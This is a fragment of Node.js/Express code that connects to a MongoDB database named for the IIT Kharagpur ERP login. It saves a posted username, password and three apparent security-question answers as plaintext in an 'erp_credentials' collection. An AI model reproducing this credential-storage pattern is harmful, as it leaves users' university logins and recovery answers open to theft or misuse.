...
MongoClient.connect(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(client => {
    ...
    db = client.db('IIT_KGP_ERP LOGIN'); // Replace with your database name
  })
...
app.post('/save-credentials', async (req, res) => {
  const { username, password, food, song, school } = req.body;

  try {
    // Insert ERP credentials into the 'erp_credentials' collection
    const result = await db.collection('erp_credentials').insertOne({ username, password, food, song, school });
